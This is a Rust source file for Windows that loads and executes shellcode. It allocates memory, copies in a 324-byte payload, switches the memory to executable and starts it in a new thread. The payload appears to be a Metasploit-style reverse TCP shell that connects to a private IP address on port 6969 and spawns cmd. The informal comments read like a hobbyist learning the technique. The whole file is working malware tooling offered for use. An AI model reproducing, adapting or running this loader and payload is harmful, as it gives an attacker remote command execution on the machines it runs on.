use std::f32::INFINITY;
use std::mem::transmute;
use std::os::raw::c_void;

use windows::core::PSTR;
use windows::Win32::System::Memory::{
    VirtualAlloc, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE, VirtualProtect
};
use windows::Win32::System::WindowsProgramming::GetUserNameA;
use windows::Wdk::System::SystemServices::{MmCopyMemory, MM_COPY_ADDRESS, MM_COPY_ADDRESS_0, MM_COPY_MEMORY_VIRTUAL};
use windows::Win32::Foundation::{NTSTATUS, WAIT_FAILED};
use windows::Win32::System::Threading::{CreateThread, THREAD_CREATION_FLAGS, LPTHREAD_START_ROUTINE, WaitForSingleObject};

use std::ptr::copy;


use std::io::stdin;

unsafe fn get_username() -> String {
    let mut size: u32 = 128;

    let psize: *mut u32 = &mut size;

    let mut user = Vec::with_capacity(size as usize);

    let lpbuffer = PSTR(user.as_mut_ptr());

    GetUserNameA(lpbuffer, psize).unwrap();

    //user.set_len(size as usize);

    String::from_utf8(user).unwrap()
}



unsafe fn run_shellcode(shellcode: [u8; 324]) -> () {
    let dwsize = shellcode.len();
    let mut numberofbytestransferred:usize = 0;
    let fiAllocationType = VIRTUAL_ALLOCATION_TYPE(0x3000);
    let rwprotect = PAGE_PROTECTION_FLAGS(0x40);
    let pmem = VirtualAlloc(None, dwsize, fiAllocationType, rwprotect);

    dbg!(pmem);
    // Takes in a byte vector, turns it into an iterator, enumerates it to pull back the index. 
    // Maps each item in the vector to MmCopyMemory. Pmem is increased by whatever index the byte is
    // at so it is written in the correct order. The source address is a reference to the currently 
    // iterated over byte that is casted to a pointer to a const u8 and then to a 
    // mutable c_void ptr for some insane person reason (google why is casting a const reference
    // directly to a mutable reference invalid in rust
    // ) and wrapped in two windows crate helper functions, 1 byte is
    // written at a time, the memory type is virtual, and the output of the function is
    // numberofbytestransferred. Output would be an iterator of NTSTATUS, but it is discarded
    // at the moment.
    //
    // This is incredibly ugly but MmCopyMemory demands those types, so I can't just pass the *byte
    // as *mut c_void. 
    //let swag = shellcode.iter().enumerate().map(|(index, byte)| MmCopyMemory(pmem.add(index), MM_COPY_ADDRESS{Anonymous:MM_COPY_ADDRESS_0{VirtualAddress:byte as *const u8 as *mut c_void}}, 1, MM_COPY_MEMORY_VIRTUAL, &mut numberofbytestransferred));
   
    let test = copy(shellcode.as_ptr(), pmem.cast(), dwsize);
    dbg!(test);

    let xprotect = PAGE_PROTECTION_FLAGS(0x10);
    let mut lpfloldprotect:PAGE_PROTECTION_FLAGS = Default::default();
    let test = VirtualProtect(pmem, dwsize, xprotect,&mut lpfloldprotect);
    dbg!(test.unwrap());

    // This is some whacky shit that I found by bypassing a medium paywall lol. Basically,
    // transmute casts what was a memory address to our shellcode to the required function pointer
    // (which in this case is LPTHREAD_START_ROUTINE, which is some insane shit that I don't
    // understand.) It infers what this value should look like and it just... works, I guess. wtf.
    let handle = dbg!(CreateThread(None, 0, Some(transmute(pmem)), None, THREAD_CREATION_FLAGS(0), None));
     

    let wait = WaitForSingleObject(handle.unwrap(), 4294967295);
    dbg!(wait);
}

fn main() {
    let testme: String;
    unsafe {
        testme = get_username();
    }
    println!("{}", testme);


    let buf: [u8; 324] = [0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,
    0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,
    0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,
    0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,
    0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,
    0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,
    0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,
    0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,
    0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,
    0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,
    0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,
    0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,
    0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,
    0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
    0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,
    0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,
    0x6a,0x05,0x68,0xc0,0xa8,0x00,0x74,0x68,0x02,0x00,0x1b,0x39,
    0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,
    0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,
    0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x00,0x89,0xe3,
    0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,
    0xc7,0x44,0x24,0x3c,0x01,0x01,0x8d,0x44,0x24,0x10,0xc6,0x00,
    0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,
    0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,
    0x46,0xff,0x30,0x68,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,
    0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,
    0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
    0x6a,0x00,0x53,0xff,0xd5];

    dbg!(buf);
    unsafe {
    run_shellcode(buf);
    }

    //let mut s=String::new();
    //let huh = stdin().read_line(&mut s).unwrap();

    //println!("{} {}", s, huh);
}
